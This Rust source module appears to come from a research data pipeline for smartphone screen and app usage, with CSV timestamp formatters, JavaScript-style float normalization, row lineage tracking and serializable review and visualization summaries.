use super::ScreenSessionClassificationPolicy;
use chrono::TimeZone;
use super::{
    AHashMap, APP_USAGE, Arc, B05SchoedelPreflightResult, BTreeMap, CODEBOOK_RENAME_PAIRS,
    COLLAPSED_GENRE_FIELD_INDICES, ComplianceResultCheckpoint, DateTime, Datelike,
    MicroUseClassification, MicroUseClassificationPolicy, MicroUseReceipt,
    MinimumDurationComparator, MinimumDurationDisposition, NO_ACTIVITY_PLACEHOLDER_PACKAGE,
    NaiveDate, Offset,
    PREPROCESSOR_VERSION, PipelineRowLineage, PipelineV2Options, Row, SCREEN_USAGE,
    ScreenIntervalLineage, ScreenSessionConstructionStrategyId, SessionGroupingPolicy,
    SharedString, Timelike, Tz, b05, b06, maximum_duration_row_stage, schoedel_is_active,
    write_csv_field,
};
use std::io::Write as _;

pub(super) fn codebook_output_columns() -> Vec<&'static str> {
    CODEBOOK_RENAME_PAIRS.iter().map(|(_, v)| *v).collect()
}

/// The codebook join's own supplied-column to output-column table. The
/// field-level workflow contract binds `app_codebook_file` columns and the codebook
/// output columns through this table instead of restating either list.
pub fn codebook_column_renames() -> &'static [(&'static str, &'static str)] {
    CODEBOOK_RENAME_PAIRS
}

// Stable column index lookup for codebook fields, matching the order above.
pub(super) fn codebook_col_index(name: &str) -> Option<usize> {
    CODEBOOK_RENAME_PAIRS.iter().position(|(_, v)| *v == name)
}

// ---- tz formatters ------------------------------------------------------

pub(super) fn ts_to_local(ts_ns: i64, tz: Tz) -> DateTime<Tz> {
    let secs = ts_ns.div_euclid(1_000_000_000);
    let nanos = ts_ns.rem_euclid(1_000_000_000) as u32;
    chrono::Utc
        .timestamp_opt(secs, nanos)
        .single()
        .expect("valid ts")
        .with_timezone(&tz)
}

// The row writers push timestamp digits directly: `write!` with chrono's
// `%:z` was about half the CSV writer. The `*_fmt` forms below are the
// fallback (a year outside 0..=9999, an offset with leftover seconds such as
// historic local mean time) and the oracle `direct_timestamp_digits_match_the_formatted_ones`
// compares against.

pub(super) fn push_two_digits(out: &mut Vec<u8>, value: u32) {
    out.extend_from_slice(&[b'0' + (value / 10) as u8, b'0' + (value % 10) as u8]);
}

pub(super) fn direct_year(local: &DateTime<Tz>) -> Option<u32> {
    u32::try_from(local.year()).ok().filter(|year| *year <= 9999)
}

/// `%:z` as (sign, hours, minutes), when the offset is whole minutes.
pub(super) fn direct_offset(local: &DateTime<Tz>) -> Option<(u8, u32, u32)> {
    let seconds = local.offset().fix().local_minus_utc();
    (seconds % 60 == 0).then(|| {
        let minutes = seconds.unsigned_abs() / 60;
        (if seconds < 0 { b'-' } else { b'+' }, minutes / 60, minutes % 60)
    })
}

pub(super) fn push_year(out: &mut Vec<u8>, year: u32) {
    push_two_digits(out, year / 100);
    push_two_digits(out, year % 100);
}

pub(super) fn push_clock(out: &mut Vec<u8>, local: &DateTime<Tz>) {
    push_two_digits(out, local.hour());
    out.push(b':');
    push_two_digits(out, local.minute());
    out.push(b':');
    push_two_digits(out, local.second());
}

pub(super) fn push_iso_date(out: &mut Vec<u8>, year: u32, local: &DateTime<Tz>) {
    push_year(out, year);
    out.push(b'-');
    push_two_digits(out, local.month());
    out.push(b'-');
    push_two_digits(out, local.day());
}

pub(super) fn push_offset(out: &mut Vec<u8>, (sign, hours, minutes): (u8, u32, u32)) {
    out.push(sign);
    push_two_digits(out, hours);
    out.push(b':');
    push_two_digits(out, minutes);
}

/// Write event_timestamp matching the established CSV contract without
/// allocating an intermediate String for every output row.
pub(super) fn emit_event_timestamp(out: &mut Vec<u8>, ts_ns: i64, tz: Tz, first: &mut bool) {
    begin_csv_field(out, first);
    let local = ts_to_local(ts_ns, tz);
    let (Some(year), Some(offset)) = (direct_year(&local), direct_offset(&local)) else {
        return write_event_timestamp_fmt(out, &local);
    };
    push_iso_date(out, year, &local);
    out.push(b' ');
    push_clock(out, &local);
    push_offset(out, offset);
}

pub(super) fn write_event_timestamp_fmt(out: &mut Vec<u8>, local: &DateTime<Tz>) {
    write!(
        out,
        "{:04}-{:02}-{:02} {:02}:{:02}:{:02}{}",
        local.year(),
        local.month(),
        local.day(),
        local.hour(),
        local.minute(),
        local.second(),
        local.format("%:z"),
    )
    .expect("writing a timestamp to Vec cannot fail");
}

pub(super) fn emit_session_timestamp(out: &mut Vec<u8>, ts_ns: Option<i64>, tz: Tz, first: &mut bool) {
    begin_csv_field(out, first);
    let Some(ns) = ts_ns else { return };
    let local = ts_to_local(ns, tz);
    let Some(year) = direct_year(&local) else {
        return write_session_timestamp_fmt(out, &local);
    };
    push_two_digits(out, local.month());
    out.push(b'-');
    push_two_digits(out, local.day());
    out.push(b'-');
    push_year(out, year);
    out.push(b' ');
    push_clock(out, &local);
}

pub(super) fn write_session_timestamp_fmt(out: &mut Vec<u8>, local: &DateTime<Tz>) {
    write!(
        out,
        "{:02}-{:02}-{:04} {:02}:{:02}:{:02}",
        local.month(),
        local.day(),
        local.year(),
        local.hour(),
        local.minute(),
        local.second(),
    )
    .expect("writing a timestamp to Vec cannot fail");
}

// Aggregate writers build a small row of owned fields before serializing it.
// Keep their existing helper while the high-volume row writers emit directly.
pub(super) fn fmt_session_timestamp(ts_ns: Option<i64>, tz: Tz) -> String {
    ts_ns
        .map(|ns| ts_to_local(ns, tz).format("%m-%d-%Y %H:%M:%S").to_string())
        .unwrap_or_default()
}

pub(super) fn emit_screen_timestamp(out: &mut Vec<u8>, ts_ns: Option<i64>, tz: Tz, first: &mut bool) {
    begin_csv_field(out, first);
    let Some(ns) = ts_ns else { return };
    let local = ts_to_local(ns, tz);
    let (Some(year), Some(offset)) = (direct_year(&local), direct_offset(&local)) else {
        return write_screen_timestamp_fmt(out, &local);
    };
    push_iso_date(out, year, &local);
    out.push(b' ');
    push_clock(out, &local);
    out.extend_from_slice(b".000000");
    push_offset(out, offset);
}

pub(super) fn write_screen_timestamp_fmt(out: &mut Vec<u8>, local: &DateTime<Tz>) {
    write!(
        out,
        "{:04}-{:02}-{:02} {:02}:{:02}:{:02}.000000{}",
        local.year(),
        local.month(),
        local.day(),
        local.hour(),
        local.minute(),
        local.second(),
        local.format("%:z"),
    )
    .expect("writing a timestamp to Vec cannot fail");
}

pub(super) fn emit_screen_last_activity(out: &mut Vec<u8>, ts_ns: Option<i64>, tz: Tz, first: &mut bool) {
    begin_csv_field(out, first);
    let Some(ns) = ts_ns else { return };
    let local = ts_to_local(ns, tz);
    write!(
        out,
        "{:04}-{:02}-{:02}T{:02}:{:02}:{:02}.000000{}",
        local.year(),
        local.month(),
        local.day(),
        local.hour(),
        local.minute(),
        local.second(),
        local.format("%z"),
    )
    .expect("writing a timestamp to Vec cannot fail");
}

/// Consecutive rows overwhelmingly share a local calendar date, so callers
/// that populate time columns in a loop pass one memo to avoid re-formatting
/// the same `YYYY-MM-DD` string per row.
#[derive(Default)]
pub(super) struct LocalDateMemo(pub(super) Option<(i32, u32, u32, SharedString)>);

impl LocalDateMemo {
    pub(super) fn date_string(&mut self, year: i32, month: u32, day: u32) -> SharedString {
        match &self.0 {
            Some((y, m, d, date)) if *y == year && *m == month && *d == day => date.clone(),
            _ => {
                let date = SharedString::from(format!("{year:04}-{month:02}-{day:02}"));
                self.0 = Some((year, month, day, date.clone()));
                date
            }
        }
    }
}

// ---- float formatting (Python-like repr) -------------------------------

/// Mirrors `normalizeFloatString` in browserPipeline.ts.
/// JS `Number.toString()` algorithm = ECMAScript shortest-round-trip format.
/// Rust f64 default Display matches IEEE 754 round-trip, but format differs
/// for some edge cases. Use ryu_js for ECMAScript-conformant output.
pub fn normalize_float_string(value: f64) -> String {
    if !value.is_finite() {
        // JS String(value) -> "NaN" | "Infinity" | "-Infinity"
        if value.is_nan() {
            return "NaN".to_string();
        }
        return if value.is_sign_positive() {
            "Infinity".to_string()
        } else {
            "-Infinity".to_string()
        };
    }
    let abs_value = value.abs();
    if abs_value != 0.0 && abs_value < 1e-4 {
        // toPrecision(15) -> parseFloat -> toExponential, then strip trailing
        // zeros in mantissa and exponent leading zeros.
        let p = round_to_precision(value, 15);
        let exp_str = to_exponential(p);
        // Replace /\.0+e/ -> "e"
        let exp_str = collapse_zero_mantissa(&exp_str);
        // Replace /e([+-])0+/ -> "e$1"
        return strip_exp_leading_zeros(&exp_str);
    }
    // toPrecision(17) -> parseFloat -> toString(); add ".0" if no decimal/E.
    // Seventeen significant digits round-trip every finite f64, so the
    // toPrecision(17) -> parseFloat step is the identity and is skipped: it
    // was ~15% of a sequential run (exact 31-digit formatting per cell).
    // Pinned by `precision_17_round_trip_is_the_identity`.
    let normalized = js_number_to_string(value);
    if normalized.contains('.') || normalized.contains('e') || normalized.contains('E') {
        normalized
    } else {
        format!("{normalized}.0")
    }
}

/// Render a float using `ryu_js` (the ECMAScript-conformant ryū variant).
pub(super) fn js_number_to_string(value: f64) -> String {
    let mut buf = ryu_js::Buffer::new();
    let s = buf.format(value);
    // ryu_js produces JS-spec output already. But ryu_js may emit "5e0"-style
    // for small ints — JS would emit "5". The `format` function on the
    // Buffer is documented to match ECMAScript ToString. So we trust it.
    s.to_string()
}

/// Round `value` to `precision` significant digits the same way JS
/// `parseFloat(value.toPrecision(precision))` would. Implementation:
/// render with N sig digits using ECMA spec, then parse back to f64.
pub(super) fn round_to_precision(value: f64, precision: u32) -> f64 {
    if !value.is_finite() || value == 0.0 {
        return value;
    }
    let s = ecma_to_precision(value, precision);
    s.parse::<f64>().unwrap_or(value)
}

/// ECMAScript Number.prototype.toPrecision(precision) — string form.
/// Spec: pick integer n with `precision` digits such that
/// n × 10^(e-precision+1) is closest to x, ties rounded up (away from 0).
pub(super) fn ecma_to_precision(value: f64, precision: u32) -> String {
    if value.is_nan() {
        return "NaN".to_string();
    }
    if value.is_infinite() {
        return if value.is_sign_negative() {
            "-Infinity".to_string()
        } else {
            "Infinity".to_string()
        };
    }
    if value == 0.0 {
        return if precision == 0 || precision == 1 {
            "0".to_string()
        } else {
            format!("0.{}", "0".repeat(precision as usize - 1))
        };
    }
    // Zero and NaN are already handled, so the sign bit is the sign.
    let neg = value.is_sign_negative();
    let abs_v = value.abs();
    // Render with high precision to inspect.
    let high = format!("{:.30e}", abs_v);
    // high looks like "5.000000000000000444089209850063e-8"
    let (mant_part, exp_part) = match high.find('e') {
        Some(i) => (&high[..i], &high[i + 1..]),
        None => (high.as_str(), "0"),
    };
    let exp: i32 = exp_part.parse().unwrap_or(0);
    // mant_part: "5.000000000000000444089209850063"
    // We want `precision` significant digits from the mantissa, then the
    // exponent stays. But we need to round at the precision-th digit.
    // First strip the decimal point to get a digit string.
    let mut digits = String::new();
    for c in mant_part.chars() {
        if c.is_ascii_digit() {
            digits.push(c);
        }
    }
    // Round digits to `precision` digits, half-away-from-zero.
    let p = precision as usize;
    if p >= digits.len() {
        // Pad with zeros, no rounding needed.
        let pad = "0".repeat(p - digits.len());
        let rounded = format!("{digits}{pad}");
        return precision_format_output(neg, &rounded, exp, p);
    }
    let kept = &digits[..p];
    let next_digit = digits.as_bytes()[p];
    let round_up = next_digit >= b'5';
    let (final_digits, exp_adjust) = if !round_up {
        (kept.to_string(), 0i32)
    } else {
        let bumped = increment_decimal_string(kept);
        if bumped.len() > kept.len() {
            // Carry propagated to a new digit; drop trailing.
            let trimmed = &bumped[..p];
            (trimmed.to_string(), 1i32)
        } else {
            (bumped, 0i32)
        }
    };
    precision_format_output(neg, &final_digits, exp + exp_adjust, p)
}

/// Format the precision-rounded digit string as an ES-spec toPrecision output.
pub(super) fn precision_format_output(neg: bool, digits: &str, exp: i32, precision: usize) -> String {
    // ES spec: if exp < -6 or exp >= precision, use exponential notation.
    let sign = if neg { "-" } else { "" };
    let p = precision;
    if exp < -6 || (exp as i64) >= p as i64 {
        // d.dddd...e±N
        let (head, tail) = digits.split_at(1);
        // Strip trailing zeros from tail to match parseFloat-back behavior?
        // No — toPrecision keeps trailing zeros. parseFloat then strips them.
        // Since we always go through parseFloat, we can keep them; parseFloat
        // returns same f64 either way.
        let mantissa = if tail.is_empty() {
            head.to_string()
        } else {
            format!("{head}.{tail}")
        };
        let exp_sign = if exp >= 0 { "+" } else { "-" };
        format!("{sign}{mantissa}e{exp_sign}{}", exp.abs())
    } else if exp >= 0 {
        // Integer or fixed-point with exp+1 digits before decimal.
        let head_len = (exp as usize) + 1;
        if head_len >= digits.len() {
            // All digits before decimal; pad with zeros.
            let pad = "0".repeat(head_len - digits.len());
            format!("{sign}{digits}{pad}")
        } else {
            let head = &digits[..head_len];
            let tail = &digits[head_len..];
            format!("{sign}{head}.{tail}")
        }
    } else {
        // 0.000ddd format. exp=-1 -> 0.d... ; exp=-2 -> 0.0d... etc.
        let leading_zeros = (-exp - 1) as usize;
        let zeros = "0".repeat(leading_zeros);
        format!("{sign}0.{zeros}{digits}")
    }
}

pub(super) fn to_exponential(value: f64) -> String {
    // JS Number.toExponential() with no arg: shortest round-trip in
    // exponential form. ryu_js's Buffer::format uses scientific form when
    // appropriate; force scientific by using format with explicit %e.
    if value == 0.0 {
        return "0e+0".to_string();
    }
    // Fall back to manual: get JS-style normalized then convert.
    // Use ryu_js's scientific output if it picked it, else build one.
    let mut buf = ryu_js::Buffer::new();
    let s = buf.format(value).to_string();
    if s.contains('e') {
        return s;
    }
    // Convert plain decimal form to scientific.
    decimal_to_exponential(&s)
}

pub(super) fn decimal_to_exponential(s: &str) -> String {
    // Parse sign
    let (sign, rest) = if let Some(stripped) = s.strip_prefix('-') {
        ("-", stripped)
    } else {
        ("", s)
    };
    // Split int and frac
    let (int_part, frac_part) = if let Some((i, f)) = rest.split_once('.') {
        (i.to_string(), f.to_string())
    } else {
        (rest.to_string(), String::new())
    };
    // Find the first non-zero digit position
    let combined: String = format!("{int_part}{frac_part}");
    let int_len = int_part.len();
    let mut first_nonzero = None;
    for (i, c) in combined.chars().enumerate() {
        if c != '0' {
            first_nonzero = Some(i);
            break;
        }
    }
    let Some(first_nonzero) = first_nonzero else {
        return format!("{sign}0e+0");
    };
    // Exponent = (int_len - 1) - first_nonzero, whether the first significant
    // digit sits in the integer part or past the decimal point: the "0.000ddd"
    // form -(first_nonzero - int_len + 1) is the same expression rearranged.
    let exp: i32 = (int_len as i32 - 1) - first_nonzero as i32;
    // Mantissa: digit at first_nonzero, then optional ".rest"
    let mantissa_digits: String = combined.chars().skip(first_nonzero).collect();
    let trimmed = mantissa_digits.trim_end_matches('0');
    let head = trimmed.chars().next().unwrap_or('0');
    let rest_m: String = trimmed.chars().skip(1).collect();
    let mantissa = if rest_m.is_empty() {
        head.to_string()
    } else {
        format!("{head}.{rest_m}")
    };
    let exp_sign = if exp >= 0 { "+" } else { "-" };
    format!("{sign}{mantissa}e{exp_sign}{}", exp.abs())
}

pub(super) fn collapse_zero_mantissa(s: &str) -> String {
    // /\.0+e/  ->  "e"
    if let Some(idx) = s.find(".0") {
        // Verify everything between idx+1 and the 'e' is zeros.
        let after_dot = &s[idx + 1..];
        if let Some(e_idx) = after_dot.find('e') {
            let zeros = &after_dot[..e_idx];
            if zeros.chars().all(|c| c == '0') {
                let mut out = String::with_capacity(s.len());
                out.push_str(&s[..idx]);
                out.push('e');
                out.push_str(&after_dot[e_idx + 1..]);
                return out;
            }
        }
    }
    s.to_string()
}

pub(super) fn strip_exp_leading_zeros(s: &str) -> String {
    // /e([+-])0+/ -> "e$1"
    if let Some(e_idx) = s.find('e') {
        let after_e = &s[e_idx + 1..];
        let mut chars = after_e.chars();
        let first = chars.next();
        if let Some(sign) = first {
            if sign == '+' || sign == '-' {
                let rest: String = chars.collect();
                let stripped = rest.trim_start_matches('0');
                let final_rest = if stripped.is_empty() { "0" } else { stripped };
                let mut out = String::with_capacity(s.len());
                out.push_str(&s[..e_idx]);
                out.push('e');
                out.push(sign);
                out.push_str(final_rest);
                return out;
            }
        }
    }
    s.to_string()
}

pub(super) fn build_row_lineage(
    output_kind: &'static str,
    terminal_query_group: &'static str,
    rows: &[Row],
) -> Vec<PipelineRowLineage> {
    build_row_lineage_from_iter(output_kind, terminal_query_group, rows.iter())
}

pub(super) fn build_row_lineage_from_iter<'a>(
    output_kind: &'static str,
    terminal_query_group: &'static str,
    rows: impl Iterator<Item = &'a Row> + 'a,
) -> Vec<PipelineRowLineage> {
    row_lineage_from_iter(output_kind, terminal_query_group, rows).collect()
}

pub(super) fn row_lineage_from_iter<'a>(
    output_kind: &'static str,
    terminal_query_group: &'static str,
    rows: impl Iterator<Item = &'a Row> + 'a,
) -> impl Iterator<Item = PipelineRowLineage> + 'a {
    let output_kind = Arc::new(output_kind.to_owned());
    let terminal_query_group = Arc::new(terminal_query_group.to_owned());
    rows.enumerate().map(move |(index, row)| PipelineRowLineage {
        output_kind: Arc::clone(&output_kind),
        output_row_index: index as u32,
        source_data_row_ranges: row.source_data_rows.ranges().to_vec(),
        source_data_row_count: row.source_data_rows.len() as u32,
        searches: row.lineage_searches.iter().cloned().collect(),
        terminal_query_group: Arc::clone(&terminal_query_group),
        screen: ScreenIntervalLineage {
            screen_interval_id: row.screen_interval_id.as_deref().map(str::to_owned),
            schoedel_completion: row
                .schoedel_completion
                .map(b05::SchoedelCompletion::canonical_id)
                .map(str::to_owned),
            ..ScreenIntervalLineage::default()
        }
        .boxed(),
    })
}

pub(super) fn build_screen_row_lineage(
    rows: &[Row],
    opts: &PipelineV2Options,
    preflight: &B05SchoedelPreflightResult,
) -> Vec<PipelineRowLineage> {
    screen_row_lineage_iter(rows, opts, preflight).collect()
}

pub(super) fn screen_row_lineage_iter<'a>(
    rows: &'a [Row],
    opts: &PipelineV2Options,
    preflight: &'a B05SchoedelPreflightResult,
) -> impl Iterator<Item = PipelineRowLineage> + 'a {
    let intervals_by_id = preflight.screen_construction.as_ref().filter(|_| {
        opts.screen_session_construction_strategy != ScreenSessionConstructionStrategyId::ChronicleScreenInteractiveV1
    }).map(|screen| screen.intervals.iter().map(|interval| (interval.screen_interval_id.as_str(), interval)).collect::<BTreeMap<_, _>>());
    row_lineage_from_iter("screen-csv", "outputs", rows.iter()).zip(rows).map(move |(mut row_lineage, row)| {
        if let Some(interval) = row.screen_interval_id.as_deref().and_then(|id| intervals_by_id.as_ref()?.get(id).copied()) {
            let screen = row_lineage.screen.get_or_insert_with(Default::default);
            screen.screen_interval_id = Some(interval.screen_interval_id.clone());
            screen.screen_construction_strategy_id = Some(interval.strategy_id.canonical_id().to_owned());
            screen.screen_interval_kind = Some(interval.kind.canonical_id().to_owned());
            screen.screen_interval_close_reason = Some(interval.close_reason.canonical_id().to_owned());
            screen.screen_interval_left_censored = Some(interval.left_censored);
            screen.screen_interval_right_censored = Some(interval.right_censored);
        }
        row_lineage
    })
}

#[derive(Debug, serde::Serialize)]
#[serde(rename_all = "camelCase")]
pub(super) struct ReviewSummary {
    pub(super) participants: Vec<ReviewParticipantSummary>,
    /// B03 is a result-level classification receipt.  It must not be projected
    /// as one label onto top-app aggregates, but an opt-in review artifact must
    /// still expose the exact requested/effective method and class census.
    /// Omit the field for `none` so the historical review JSON stays byte exact.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub(super) micro_use_receipt: Option<MicroUseReceipt>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub(super) foundational_provenance: Option<FoundationalOutputProjection>,
}

#[derive(Debug, Clone, serde::Serialize)]
#[serde(rename_all = "camelCase")]
pub(super) struct FoundationalOutputProjection {
    pub(super) protocol_version: &'static str,
    pub(super) screen_construction_strategy_id: String,
    pub(super) screen_interval_digest: String,
    pub(super) screen_interval_ids: Vec<String>,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub(super) screen_intervals: Vec<b05::ScreenIntervalEvidence>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub(super) schoedel_episode_digest: Option<String>,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub(super) schoedel_episode_bindings: Vec<SchoedelEpisodeProjection>,
}

#[derive(Debug, Clone, serde::Serialize)]
#[serde(rename_all = "camelCase")]
pub(super) struct SchoedelEpisodeProjection {
    pub(super) episode_id: String,
    pub(super) screen_interval_id: String,
    pub(super) completion: b05::SchoedelCompletion,
    pub(super) bounded_headline_candidate: bool,
}

pub(super) fn foundational_output_projection(
    opts: &PipelineV2Options,
    preflight: &B05SchoedelPreflightResult,
) -> Option<FoundationalOutputProjection> {
    let expose = opts.screen_session_construction_strategy
        != ScreenSessionConstructionStrategyId::ChronicleScreenInteractiveV1
        || schoedel_is_active(opts);
    if !expose {
        return None;
    }
    let screen = preflight.screen_construction.as_ref()?;
    let receipt = screen.construction_receipt.as_ref()?;
    let schoedel = preflight.schoedel_reconstruction.as_ref();
    Some(FoundationalOutputProjection {
        protocol_version: "chronicle-foundational-output-projection/v1",
        screen_construction_strategy_id: receipt.strategy_id.canonical_id().to_owned(),
        screen_interval_digest: receipt.interval_digest.clone(),
        screen_interval_ids: screen
            .intervals
            .iter()
            .map(|interval| interval.screen_interval_id.clone())
            .collect(),
        screen_intervals: screen.intervals.clone(),
        schoedel_episode_digest: schoedel
            .and_then(|output| output.reconstruction_receipt.as_ref())
            .map(|receipt| receipt.episode_digest.clone()),
        schoedel_episode_bindings: schoedel
            .map(|output| {
                output
                    .episodes
                    .iter()
                    .map(|episode| SchoedelEpisodeProjection {
                        episode_id: episode.episode_id.clone(),
                        screen_interval_id: episode.screen_interval_id.clone(),
                        completion: episode.completion,
                        bounded_headline_candidate: episode.bounded_headline_candidate,
                    })
                    .collect()
            })
            .unwrap_or_default(),
    })
}

#[derive(Debug, serde::Serialize)]
#[serde(rename_all = "camelCase")]
pub(super) struct ReviewParticipantSummary {
    pub(super) participant_id: SharedString,
    pub(super) study_id: SharedString,
    pub(super) totals: ReviewParticipantTotals,
    pub(super) per_day: Vec<ReviewDayMetrics>,
    pub(super) top_apps_by_date: BTreeMap<SharedString, Vec<ReviewTopApp>>,
}

#[derive(Debug, serde::Serialize)]
#[serde(rename_all = "camelCase")]
pub(super) struct ReviewParticipantTotals {
    pub(super) app_usage_minutes: f64,
    pub(super) background_app_usage_minutes: f64,
    pub(super) screen_usage_minutes: f64,
    pub(super) app_session_count: usize,
    pub(super) screen_session_count: usize,
    pub(super) days_with_usage: usize,
    pub(super) total_days: usize,
}

#[derive(Debug, Clone, serde::Serialize)]
#[serde(rename_all = "camelCase")]
pub(super) struct ReviewDayMetrics {
    pub(super) date: SharedString,
    pub(super) app_usage_minutes: f64,
    pub(super) background_app_usage_minutes: f64,
    pub(super) screen_usage_minutes: f64,
    pub(super) app_session_count: usize,
    pub(super) screen_session_count: usize,
    pub(super) flags: Vec<String>,
}

#[derive(Debug, serde::Serialize)]
#[serde(rename_all = "camelCase")]
pub(super) struct ReviewTopApp {
    pub(super) app_package_name: SharedString,
    pub(super) application_label: SharedString,
    pub(super) category: Option<SharedString>,
    pub(super) minutes: f64,
}

#[derive(Default)]
pub(super) struct ReviewDayAccumulator {
    pub(super) app_ns: i128,
    pub(super) background_ns: i128,
    pub(super) screen_ns: i128,
    pub(super) app_session_count: usize,
    pub(super) screen_session_count: usize,
}

pub(super) struct ReviewTopAppAccumulator {
    pub(super) application_label: SharedString,
    pub(super) category: Option<SharedString>,
    pub(super) minutes: f64,
}

#[derive(Debug, serde::Serialize)]
#[serde(rename_all = "camelCase")]
pub(super) struct VisualizationData<'a> {
    pub(super) protocol_version: &'static str,
    pub(super) columns: &'static [&'static str],
    pub(super) app_rows: VisualizationRows<'a>,
    pub(super) screen_rows: VisualizationRows<'a>,
    pub(super) event_timestamps_by_participant: BTreeMap<String, Vec<JsonI64>>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub(super) foundational_provenance: Option<FoundationalOutputProjection>,
}

pub(super) struct VisualizationRows<'a> {
    pub(super) rows: &'a [Row],
    pub(super) expose_b03: bool,
}

impl std::fmt::Debug for VisualizationRows<'_> {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        formatter.debug_struct("VisualizationRows").field("len", &self.rows.len()).finish()
    }
}

impl serde::Serialize for VisualizationRows<'_> {
    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        serializer.collect_seq(self.rows.iter().map(|row| visualization_row(row, self.expose_b03)))
    }
}

#[derive(Debug, Clone, Copy)]
pub(super) struct JsonI64(pub(super) i64);

impl serde::Serialize for JsonI64 {
    fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
    where
        S: serde::Serializer,
    {
        serializer.collect_str(&self.0)
    }
}

pub(super) const VISUALIZATION_DATA_PROTOCOL: &str = "chronicle-visualization-data/v2";

pub(super) const VISUALIZATION_DATA_FOUNDATIONAL_PROTOCOL: &str = "chronicle-visualization-data/v3";

pub(super) const VISUALIZATION_DATA_B03_PROTOCOL: &str = "chronicle-visualization-data/v4";

pub(super) const VISUALIZATION_DATA_COLUMNS: &[&str] = &[
    "participantId",
    "date",
    "startTimestampNs",
    "stopTimestampNs",
    "eventTimestampNs",
    "interactionType",
    "broadAppCategory",
    "appPackageName",
    "applicationLabel",
    "username",
    "screenUsageEndReason",
];

pub(super) const VISUALIZATION_DATA_B03_COLUMNS: &[&str] = &[
    "participantId",
    "date",
    "startTimestampNs",
    "stopTimestampNs",
    "eventTimestampNs",
    "interactionType",
    "broadAppCategory",
    "appPackageName",
    "applicationLabel",
    "username",
    "screenUsageEndReason",
    "microUseClassification",
];

#[derive(Debug, serde::Serialize)]
pub(super) struct BaselineVisualizationRow<'a>(
    &'a str,
    &'a str,
    Option<JsonI64>,
    Option<JsonI64>,
    JsonI64,
    &'a str,
    Option<&'a str>,
    &'a str,
    &'a str,
    &'a str,
    Option<&'a str>,
);

#[derive(Debug, serde::Serialize)]
pub(super) struct B03VisualizationRow<'a>(
    &'a str,
    &'a str,
    Option<JsonI64>,
    Option<JsonI64>,
    JsonI64,
    &'a str,
    Option<&'a str>,
    &'a str,
    &'a str,
    &'a str,
    Option<&'a str>,
    &'a str,
);

#[derive(Debug, serde::Serialize)]
#[serde(untagged)]
pub(super) enum VisualizationRow<'a> {
    Baseline(BaselineVisualizationRow<'a>),
    B03(B03VisualizationRow<'a>),
}

pub(super) fn visualization_row(row: &Row, expose_b03: bool) -> VisualizationRow<'_> {
    let baseline = BaselineVisualizationRow(
        row.participant_id.as_str(),
        row.date.as_str(),
        row.start_timestamp_ns.map(JsonI64),
        row.stop_timestamp_ns.map(JsonI64),
        JsonI64(row.event_timestamp_ns),
        row.interaction_type.as_str(),
        row.broad_app_category.as_ref().map(SharedString::as_str),
        row.app_package_name.as_str(),
        row.application_label.as_str(),
        row.username.as_str(),
        row.screen_usage_end_reason
            .as_ref()
            .map(SharedString::as_str),
    );
    if !expose_b03 {
        return VisualizationRow::Baseline(baseline);
    }
    VisualizationRow::B03(B03VisualizationRow(
        baseline.0,
        baseline.1,
        baseline.2,
        baseline.3,
        baseline.4,
        baseline.5,
        baseline.6,
        baseline.7,
        baseline.8,
        baseline.9,
        baseline.10,
        row.micro_use_classification
            .map(MicroUseClassification::canonical_id)
            .unwrap_or("not_applicable"),
    ))
}

pub(super) fn participant_event_timestamps(policy_rows: &[Row]) -> BTreeMap<String, Vec<JsonI64>> {
    let mut by_participant = BTreeMap::<String, Vec<JsonI64>>::new();
    for row in policy_rows {
        let participant = if row.participant_id.is_empty() {
            "unknown"
        } else {
            row.participant_id.as_str()
        };
        match by_participant.get_mut(participant) {
            Some(timestamps) => timestamps.push(JsonI64(row.event_timestamp_ns)),
            None => {
                by_participant
                    .insert(participant.to_owned(), vec![JsonI64(row.event_timestamp_ns)]);
            }
        }
    }
    by_participant
}

pub(super) fn build_visualization_data<'a>(
    app_rows: &'a [Row],
    screen_rows: &'a [Row],
    event_timestamps_by_participant: BTreeMap<String, Vec<JsonI64>>,
    foundational_provenance: Option<FoundationalOutputProjection>,
    expose_b03: bool,
) -> VisualizationData<'a> {
    let protocol_version = if expose_b03 {
        VISUALIZATION_DATA_B03_PROTOCOL
    } else if foundational_provenance.is_some() {
        VISUALIZATION_DATA_FOUNDATIONAL_PROTOCOL
    } else {
        VISUALIZATION_DATA_PROTOCOL
    };
    VisualizationData {
        protocol_version,
        columns: if expose_b03 {
            VISUALIZATION_DATA_B03_COLUMNS
        } else {
            VISUALIZATION_DATA_COLUMNS
        },
        app_rows: VisualizationRows { rows: app_rows, expose_b03 },
        screen_rows: VisualizationRows { rows: screen_rows, expose_b03 },
        event_timestamps_by_participant,
        foundational_provenance,
    }
}

pub(super) fn review_round4(value: f64) -> f64 {
    (value * 10_000.0).round() / 10_000.0
}

pub(super) fn complete_session(row: &Row, interaction_type: &str) -> bool {
    row.interaction_type == interaction_type
        && (interaction_type != APP_USAGE
            || (row.minimum_duration_aggregate_eligible
                && row.maximum_duration_aggregate_eligible
                && row.app_package_name != NO_ACTIVITY_PLACEHOLDER_PACKAGE))
        && row.start_timestamp_ns.is_some()
        && row.stop_timestamp_ns.is_some()
}

pub(super) fn headline_eligible_app_rows(rows: &[Row]) -> std::borrow::Cow<'_, [Row]> {
    let eligible =
        |row: &Row| row.minimum_duration_aggregate_eligible && row.maximum_duration_aggregate_eligible;
    if rows.iter().any(|row| !eligible(row)) {
        std::borrow::Cow::Owned(rows.iter().filter(|row| eligible(row)).cloned().collect())
    } else {
        std::borrow::Cow::Borrowed(rows)
    }
}

pub(super) fn review_duration_ns(row: &Row) -> i128 {
    if row.duration_minutes.is_none() {
        return 0;
    }
    i128::from(row.stop_timestamp_ns.unwrap_or_default())
        - i128::from(row.start_timestamp_ns.unwrap_or_default())
}

pub(super) fn review_minutes(ns: i128) -> f64 {
    review_round4(ns as f64 / 60_000_000_000.0)
}

/// Ten years: longer than any study, shorter than the distance to 1970.
pub(super) const REVIEW_SUMMARY_MAX_FILLED_SPAN_DAYS: i64 = 3_660;

